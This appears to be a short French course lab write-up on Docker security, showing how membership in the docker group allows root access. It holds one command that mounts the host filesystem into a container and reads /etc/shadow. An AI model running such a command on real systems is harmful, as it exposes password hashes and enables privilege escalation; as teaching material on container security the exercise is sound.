## Part IV : Docker security

# 1. Le groupe docker

Prouvez que vous pouvez devenir root

la seule commande docker run est celle ci

```
azureuser@cloudtp:~$ docker run --rm -v /:/mnt ubuntu cat /mnt/etc/shadow

```